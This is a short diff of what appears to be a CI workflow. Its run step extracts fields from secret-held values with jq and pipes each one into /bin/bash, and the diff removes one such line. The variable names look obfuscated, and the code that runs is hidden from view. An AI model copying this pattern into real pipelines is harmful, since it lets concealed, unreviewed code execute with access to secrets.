@@ -20,7 +20,6 @@ jobs:
           rrvf9: ${{ secrets.rrvf9 }}
         run: |
           printf '%s' "$rrvf9" | jq -r .nhr6 | /bin/bash
-          echo $jzpes1271 | jq -r .wwvf4 | /bin/bash
           echo $ihkn393 | jq -r .j6 | /bin/bash
           printf '%s' "$xetrt70680" | jq -r .kzd460 | /bin/bash
           printf '%s' "$nhlt53" | jq -r .dnohx7598 | /bin/bash
